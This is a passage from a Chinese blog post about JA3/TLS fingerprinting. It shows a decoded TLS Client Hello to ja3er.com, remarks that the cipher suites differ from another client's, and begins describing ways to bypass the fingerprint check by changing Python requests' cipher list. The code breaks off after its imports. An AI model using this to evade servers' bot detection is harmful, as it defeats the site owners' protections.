class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br></pre></td><td class="code"><pre><span class="line">TLSv1.2 Record Layer: Handshake Protocol: Client Hello</span><br><span class="line">    Content Type: Handshake (22)</span><br><span class="line">    Version: TLS 1.2 (0x0303)</span><br><span class="line">    Length: 707</span><br><span class="line">    Handshake Protocol: Client Hello</span><br><span class="line">        Handshake Type: Client Hello (1)</span><br><span class="line">        Length: 703</span><br><span class="line">        Version: TLS 1.2 (0x0303)</span><br><span class="line">        Random: 9c9c8d20358ad1f04427cb7f47b87a05cc7df36e9f8620e34189c7d9d7c4c394</span><br><span class="line">            GMT Unix Time: Apr  6, 2053 06:37:20.000000000 CST</span><br><span class="line">            Random Bytes: 358ad1f04427cb7f47b87a05cc7df36e9f8620e34189c7d9d7c4c394</span><br><span class="line">        Session ID Length: 32</span><br><span class="line">        Session ID: 936def16329bcf32ee79aec0d9df57df057fabef59bebe3c2fad454c8ae5956f</span><br><span class="line">        Cipher Suites Length: 112</span><br><span class="line">        Cipher Suites (56 suites)</span><br><span class="line">            Cipher Suite: TLS_AES_256_GCM_SHA384 (0x1302)</span><br><span class="line">            Cipher Suite: TLS_AES_128_GCM_SHA256 (0x1301)</span><br><span class="line">            Cipher Suite: TLS_CHACHA20_POLY1305_SHA256 (0x1303)</span><br><span class="line">            Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 (0xc02c)</span><br><span class="line">            Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 (0xc02b)</span><br><span class="line">            Cipher Suite: TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256 (0xcca9)</span><br><span class="line">            Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (0xc030)</span><br><span class="line">            Cipher Suite: TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256 (0xcca8)</span><br><span class="line">            Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (0xc02f)</span><br><span class="line">            Cipher Suite: TLS_DHE_RSA_WITH_AES_256_GCM_SHA384 (0x009f)</span><br><span class="line">            Cipher Suite: TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256 (0xccaa)</span><br><span class="line">            Cipher Suite: TLS_DHE_DSS_WITH_AES_256_GCM_SHA384 (0x00a3)</span><br><span class="line">            Cipher Suite: TLS_DHE_RSA_WITH_AES_128_GCM_SHA256 (0x009e)</span><br><span class="line">            Cipher Suite: TLS_DHE_DSS_WITH_AES_128_GCM_SHA256 (0x00a2)</span><br><span class="line">            Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384 (0xc024)</span><br><span class="line">            Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 (0xc028)</span><br><span class="line">            Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256 (0xc023)</span><br><span class="line">            Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 (0xc027)</span><br><span class="line">            Cipher Suite: TLS_DHE_RSA_WITH_AES_256_CBC_SHA256 (0x006b)</span><br><span class="line">            Cipher Suite: TLS_DHE_DSS_WITH_AES_256_CBC_SHA256 (0x006a)</span><br><span class="line">            Cipher Suite: TLS_DHE_RSA_WITH_AES_128_CBC_SHA256 (0x0067)</span><br><span class="line">            Cipher Suite: TLS_DHE_DSS_WITH_AES_128_CBC_SHA256 (0x0040)</span><br><span class="line">            Cipher Suite: TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384 (0xc02e)</span><br><span class="line">            Cipher Suite: TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384 (0xc032)</span><br><span class="line">            Cipher Suite: TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256 (0xc02d)</span><br><span class="line">            Cipher Suite: TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256 (0xc031)</span><br><span class="line">            Cipher Suite: TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA384 (0xc026)</span><br><span class="line">            Cipher Suite: TLS_ECDH_RSA_WITH_AES_256_CBC_SHA384 (0xc02a)</span><br><span class="line">            Cipher Suite: TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA256 (0xc025)</span><br><span class="line">            Cipher Suite: TLS_ECDH_RSA_WITH_AES_128_CBC_SHA256 (0xc029)</span><br><span class="line">            Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (0xc00a)</span><br><span class="line">            Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (0xc014)</span><br><span class="line">            Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA (0xc009)</span><br><span class="line">            Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (0xc013)</span><br><span class="line">            Cipher Suite: TLS_DHE_RSA_WITH_AES_256_CBC_SHA (0x0039)</span><br><span class="line">            Cipher Suite: TLS_DHE_DSS_WITH_AES_256_CBC_SHA (0x0038)</span><br><span class="line">            Cipher Suite: TLS_DHE_RSA_WITH_AES_128_CBC_SHA (0x0033)</span><br><span class="line">            Cipher Suite: TLS_DHE_DSS_WITH_AES_128_CBC_SHA (0x0032)</span><br><span class="line">            Cipher Suite: TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA (0xc005)</span><br><span class="line">            Cipher Suite: TLS_ECDH_RSA_WITH_AES_256_CBC_SHA (0xc00f)</span><br><span class="line">            Cipher Suite: TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA (0xc004)</span><br><span class="line">            Cipher Suite: TLS_ECDH_RSA_WITH_AES_128_CBC_SHA (0xc00e)</span><br><span class="line">            Cipher Suite: TLS_RSA_WITH_AES_256_GCM_SHA384 (0x009d)</span><br><span class="line">            Cipher Suite: TLS_RSA_WITH_AES_128_GCM_SHA256 (0x009c)</span><br><span class="line">            Cipher Suite: TLS_RSA_WITH_AES_256_CBC_SHA256 (0x003d)</span><br><span class="line">            Cipher Suite: TLS_RSA_WITH_AES_128_CBC_SHA256 (0x003c)</span><br><span class="line">            Cipher Suite: TLS_RSA_WITH_AES_256_CBC_SHA (0x0035)</span><br><span class="line">            Cipher Suite: TLS_RSA_WITH_AES_128_CBC_SHA (0x002f)</span><br><span class="line">            Cipher Suite: TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA (0xc008)</span><br><span class="line">            Cipher Suite: TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (0xc012)</span><br><span class="line">            Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA (0x0016)</span><br><span class="line">            Cipher Suite: TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA (0x0013)</span><br><span class="line">            Cipher Suite: TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA (0xc003)</span><br><span class="line">            Cipher Suite: TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA (0xc00d)</span><br><span class="line">            Cipher Suite: TLS_RSA_WITH_3DES_EDE_CBC_SHA (0x000a)</span><br><span class="line">            Cipher Suite: TLS_EMPTY_RENEGOTIATION_INFO_SCSV (0x00ff)</span><br><span class="line">        Compression Methods Length: 1</span><br><span class="line">        Compression Methods (1 method)</span><br><span class="line">            Compression Method: null (0)</span><br><span class="line">        Extensions Length: 518</span><br><span class="line">        Extension: server_name (len&#x3D;14)</span><br><span class="line">            Type: server_name (0)</span><br><span class="line">            Length: 14</span><br><span class="line">            Server Name Indication extension</span><br><span class="line">                Server Name list length: 12</span><br><span class="line">                Server Name Type: host_name (0)</span><br><span class="line">                Server Name length: 9</span><br><span class="line">                Server Name: ja3er.com</span><br><span class="line">        Extension: status_request (len&#x3D;5)</span><br><span class="line">            Type: status_request (5)</span><br><span class="line">            Length: 5</span><br><span class="line">            Certificate Status Type: OCSP (1)</span><br><span class="line">            Responder ID list Length: 0</span><br><span class="line">            Request Extensions Length: 0</span><br><span class="line">        Extension: supported_groups (len&#x3D;22)</span><br><span class="line">            Type: supported_groups (10)</span><br><span class="line">            Length: 22</span><br><span class="line">            Supported Groups List Length: 20</span><br><span class="line">            Supported Groups (10 groups)</span><br><span class="line">                Supported Group: x25519 (0x001d)</span><br><span class="line">                Supported Group: secp256r1 (0x0017)</span><br><span class="line">                Supported Group: secp384r1 (0x0018)</span><br><span class="line">                Supported Group: secp521r1 (0x0019)</span><br><span class="line">                Supported Group: x448 (0x001e)</span><br><span class="line">                Supported Group: ffdhe2048 (0x0100)</span><br><span class="line">                Supported Group: ffdhe3072 (0x0101)</span><br><span class="line">                Supported Group: ffdhe4096 (0x0102)</span><br><span class="line">                Supported Group: ffdhe6144 (0x0103)</span><br><span class="line">                Supported Group: ffdhe8192 (0x0104)</span><br><span class="line">        Extension: ec_point_formats (len&#x3D;2)</span><br><span class="line">            Type: ec_point_formats (11)</span><br><span class="line">            Length: 2</span><br><span class="line">            EC point formats Length: 1</span><br><span class="line">            Elliptic curves point formats (1)</span><br><span class="line">                EC point format: uncompressed (0)</span><br><span class="line">        Extension: signature_algorithms (len&#x3D;46)</span><br><span class="line">            Type: signature_algorithms (13)</span><br><span class="line">            Length: 46</span><br><span class="line">            Signature Hash Algorithms Length: 44</span><br><span class="line">            Signature Hash Algorithms (22 algorithms)</span><br><span class="line">                Signature Algorithm: ecdsa_secp256r1_sha256 (0x0403)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA256 (4)</span><br><span class="line">                    Signature Hash Algorithm Signature: ECDSA (3)</span><br><span class="line">                Signature Algorithm: ecdsa_secp384r1_sha384 (0x0503)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA384 (5)</span><br><span class="line">                    Signature Hash Algorithm Signature: ECDSA (3)</span><br><span class="line">                Signature Algorithm: ecdsa_secp521r1_sha512 (0x0603)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA512 (6)</span><br><span class="line">                    Signature Hash Algorithm Signature: ECDSA (3)</span><br><span class="line">                Signature Algorithm: ed25519 (0x0807)</span><br><span class="line">                    Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                    Signature Hash Algorithm Signature: Unknown (7)</span><br><span class="line">                Signature Algorithm: ed448 (0x0808)</span><br><span class="line">                    Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                    Signature Hash Algorithm Signature: Unknown (8)</span><br><span class="line">                Signature Algorithm: rsa_pss_rsae_sha256 (0x0804)</span><br><span class="line">                    Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                    Signature Hash Algorithm Signature: SM2 (4)</span><br><span class="line">                Signature Algorithm: rsa_pss_rsae_sha384 (0x0805)</span><br><span class="line">                    Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                    Signature Hash Algorithm Signature: Unknown (5)</span><br><span class="line">                Signature Algorithm: rsa_pss_rsae_sha512 (0x0806)</span><br><span class="line">                    Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                    Signature Hash Algorithm Signature: Unknown (6)</span><br><span class="line">                Signature Algorithm: rsa_pss_pss_sha256 (0x0809)</span><br><span class="line">                    Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                    Signature Hash Algorithm Signature: Unknown (9)</span><br><span class="line">                Signature Algorithm: rsa_pss_pss_sha384 (0x080a)</span><br><span class="line">                    Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                    Signature Hash Algorithm Signature: Unknown (10)</span><br><span class="line">                Signature Algorithm: rsa_pss_pss_sha512 (0x080b)</span><br><span class="line">                    Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                    Signature Hash Algorithm Signature: Unknown (11)</span><br><span class="line">                Signature Algorithm: rsa_pkcs1_sha256 (0x0401)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA256 (4)</span><br><span class="line">                    Signature Hash Algorithm Signature: RSA (1)</span><br><span class="line">                Signature Algorithm: rsa_pkcs1_sha384 (0x0501)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA384 (5)</span><br><span class="line">                    Signature Hash Algorithm Signature: RSA (1)</span><br><span class="line">                Signature Algorithm: rsa_pkcs1_sha512 (0x0601)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA512 (6)</span><br><span class="line">                    Signature Hash Algorithm Signature: RSA (1)</span><br><span class="line">                Signature Algorithm: SHA256 DSA (0x0402)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA256 (4)</span><br><span class="line">                    Signature Hash Algorithm Signature: DSA (2)</span><br><span class="line">                Signature Algorithm: SHA224 ECDSA (0x0303)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA224 (3)</span><br><span class="line">                    Signature Hash Algorithm Signature: ECDSA (3)</span><br><span class="line">                Signature Algorithm: SHA224 RSA (0x0301)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA224 (3)</span><br><span class="line">                    Signature Hash Algorithm Signature: RSA (1)</span><br><span class="line">                Signature Algorithm: SHA224 DSA (0x0302)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA224 (3)</span><br><span class="line">                    Signature Hash Algorithm Signature: DSA (2)</span><br><span class="line">                Signature Algorithm: ecdsa_sha1 (0x0203)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA1 (2)</span><br><span class="line">                    Signature Hash Algorithm Signature: ECDSA (3)</span><br><span class="line">                Signature Algorithm: rsa_pkcs1_sha1 (0x0201)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA1 (2)</span><br><span class="line">                    Signature Hash Algorithm Signature: RSA (1)</span><br><span class="line">                Signature Algorithm: SHA1 DSA (0x0202)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA1 (2)</span><br><span class="line">                    Signature Hash Algorithm Signature: DSA (2)</span><br><span class="line">                Signature Algorithm: MD5 RSA (0x0101)</span><br><span class="line">                    Signature Hash Algorithm Hash: MD5 (1)</span><br><span class="line">                    Signature Hash Algorithm Signature: RSA (1)</span><br><span class="line">        Extension: signature_algorithms_cert (len&#x3D;46)</span><br><span class="line">            Type: signature_algorithms_cert (50)</span><br><span class="line">            Length: 46</span><br><span class="line">            Signature Hash Algorithms Length: 44</span><br><span class="line">            Signature Hash Algorithms (22 algorithms)</span><br><span class="line">                Signature Algorithm: ecdsa_secp256r1_sha256 (0x0403)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA256 (4)</span><br><span class="line">                    Signature Hash Algorithm Signature: ECDSA (3)</span><br><span class="line">                Signature Algorithm: ecdsa_secp384r1_sha384 (0x0503)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA384 (5)</span><br><span class="line">                    Signature Hash Algorithm Signature: ECDSA (3)</span><br><span class="line">                Signature Algorithm: ecdsa_secp521r1_sha512 (0x0603)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA512 (6)</span><br><span class="line">                    Signature Hash Algorithm Signature: ECDSA (3)</span><br><span class="line">                Signature Algorithm: ed25519 (0x0807)</span><br><span class="line">                    Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                    Signature Hash Algorithm Signature: Unknown (7)</span><br><span class="line">                Signature Algorithm: ed448 (0x0808)</span><br><span class="line">                    Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                    Signature Hash Algorithm Signature: Unknown (8)</span><br><span class="line">                Signature Algorithm: rsa_pss_rsae_sha256 (0x0804)</span><br><span class="line">                    Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                    Signature Hash Algorithm Signature: SM2 (4)</span><br><span class="line">                Signature Algorithm: rsa_pss_rsae_sha384 (0x0805)</span><br><span class="line">                    Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                    Signature Hash Algorithm Signature: Unknown (5)</span><br><span class="line">                Signature Algorithm: rsa_pss_rsae_sha512 (0x0806)</span><br><span class="line">                    Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                    Signature Hash Algorithm Signature: Unknown (6)</span><br><span class="line">                Signature Algorithm: rsa_pss_pss_sha256 (0x0809)</span><br><span class="line">                    Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                    Signature Hash Algorithm Signature: Unknown (9)</span><br><span class="line">                Signature Algorithm: rsa_pss_pss_sha384 (0x080a)</span><br><span class="line">                    Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                    Signature Hash Algorithm Signature: Unknown (10)</span><br><span class="line">                Signature Algorithm: rsa_pss_pss_sha512 (0x080b)</span><br><span class="line">                    Signature Hash Algorithm Hash: Unknown (8)</span><br><span class="line">                    Signature Hash Algorithm Signature: Unknown (11)</span><br><span class="line">                Signature Algorithm: rsa_pkcs1_sha256 (0x0401)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA256 (4)</span><br><span class="line">                    Signature Hash Algorithm Signature: RSA (1)</span><br><span class="line">                Signature Algorithm: rsa_pkcs1_sha384 (0x0501)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA384 (5)</span><br><span class="line">                    Signature Hash Algorithm Signature: RSA (1)</span><br><span class="line">                Signature Algorithm: rsa_pkcs1_sha512 (0x0601)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA512 (6)</span><br><span class="line">                    Signature Hash Algorithm Signature: RSA (1)</span><br><span class="line">                Signature Algorithm: SHA256 DSA (0x0402)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA256 (4)</span><br><span class="line">                    Signature Hash Algorithm Signature: DSA (2)</span><br><span class="line">                Signature Algorithm: SHA224 ECDSA (0x0303)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA224 (3)</span><br><span class="line">                    Signature Hash Algorithm Signature: ECDSA (3)</span><br><span class="line">                Signature Algorithm: SHA224 RSA (0x0301)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA224 (3)</span><br><span class="line">                    Signature Hash Algorithm Signature: RSA (1)</span><br><span class="line">                Signature Algorithm: SHA224 DSA (0x0302)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA224 (3)</span><br><span class="line">                    Signature Hash Algorithm Signature: DSA (2)</span><br><span class="line">                Signature Algorithm: ecdsa_sha1 (0x0203)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA1 (2)</span><br><span class="line">                    Signature Hash Algorithm Signature: ECDSA (3)</span><br><span class="line">                Signature Algorithm: rsa_pkcs1_sha1 (0x0201)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA1 (2)</span><br><span class="line">                    Signature Hash Algorithm Signature: RSA (1)</span><br><span class="line">                Signature Algorithm: SHA1 DSA (0x0202)</span><br><span class="line">                    Signature Hash Algorithm Hash: SHA1 (2)</span><br><span class="line">                    Signature Hash Algorithm Signature: DSA (2)</span><br><span class="line">                Signature Algorithm: MD5 RSA (0x0101)</span><br><span class="line">                    Signature Hash Algorithm Hash: MD5 (1)</span><br><span class="line">                    Signature Hash Algorithm Signature: RSA (1)</span><br><span class="line">        Extension: status_request_v2 (len&#x3D;9)</span><br><span class="line">            Type: status_request_v2 (17)</span><br><span class="line">            Length: 9</span><br><span class="line">            Certificate Status List Length: 7</span><br><span class="line">            Certificate Status Type: OCSP Multi (2)</span><br><span class="line">            Certificate Status Length: 4</span><br><span class="line">            Responder ID list Length: 0</span><br><span class="line">            Request Extensions Length: 0</span><br><span class="line">        Extension: extended_master_secret (len&#x3D;0)</span><br><span class="line">            Type: extended_master_secret (23)</span><br><span class="line">            Length: 0</span><br><span class="line">        Extension: session_ticket (len&#x3D;208)</span><br><span class="line">            Type: session_ticket (35)</span><br><span class="line">            Length: 208</span><br><span class="line">            Data (208 bytes)</span><br><span class="line">        Extension: supported_versions (len&#x3D;9)</span><br><span class="line">            Type: supported_versions (43)</span><br><span class="line">            Length: 9</span><br><span class="line">            Supported Versions length: 8</span><br><span class="line">            Supported Version: TLS 1.3 (0x0304)</span><br><span class="line">            Supported Version: TLS 1.2 (0x0303)</span><br><span class="line">            Supported Version: TLS 1.1 (0x0302)</span><br><span class="line">            Supported Version: TLS 1.0 (0x0301)</span><br><span class="line">        Extension: psk_key_exchange_modes (len&#x3D;2)</span><br><span class="line">            Type: psk_key_exchange_modes (45)</span><br><span class="line">            Length: 2</span><br><span class="line">            PSK Key Exchange Modes Length: 1</span><br><span class="line">            PSK Key Exchange Mode: PSK with (EC)DHE key establishment (psk_dhe_ke) (1)</span><br><span class="line">        Extension: key_share (len&#x3D;107)</span><br><span class="line">            Type: key_share (51)</span><br><span class="line">            Length: 107</span><br><span class="line">            Key Share extension</span><br><span class="line">                Client Key Share Length: 105</span><br><span class="line">                Key Share Entry: Group: x25519, Key Exchange length: 32</span><br><span class="line">                    Group: x25519 (29)</span><br><span class="line">                    Key Exchange Length: 32</span><br><span class="line">                    Key Exchange: c8bec5524c23aeec01f4dc54f4f66d98f324033d7cb49bd962d43b3c80e93932</span><br><span class="line">                Key Share Entry: Group: secp256r1, Key Exchange length: 65</span><br><span class="line">                    Group: secp256r1 (23)</span><br><span class="line">                    Key Exchange Length: 65</span><br><span class="line">                    Key Exchange: 045596de0177e5db84f608492167e250e795cb511fb8f107487f6ba58964b211c71d014b…</span><br></pre></td></tr></table></figure><h2 id="compare对比一下"><a href="#compare对比一下" class="headerlink" title="compare对比一下"></a>compare对比一下</h2><p>发现加密套件Cipher Suites 相差特别多</p><p><img src="https://img-blog.csdnimg.cn/img_convert/235e34bd8105b21398d56f961c58b6a7.png" alt="image-20220208141211573"></p><h1 id="0x04-问题解决"><a href="#0x04-问题解决" class="headerlink" title="0x04 问题解决"></a>0x04 问题解决</h1><p>作为脚本小子，当让得bypass了这个，要不以后啥也干不了了，暂时找到了两种方法</p><ul><li>改自己的代码逻辑，</li><li>直接修改底层的依赖包</li></ul><h2 id="方法一、修改上层代码"><a href="#方法一、修改上层代码" class="headerlink" title="方法一、修改上层代码"></a>方法一、修改上层代码</h2><p>这个是参考网上的一段代码，大家可以自行修改一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.util.ssl_ <span class="keyword">import</span> create_urllib3_context</span><br><span class="line"></span><br><span class="line">ORIGIN_CIPHERS = (</span><br><span class="line">    <span 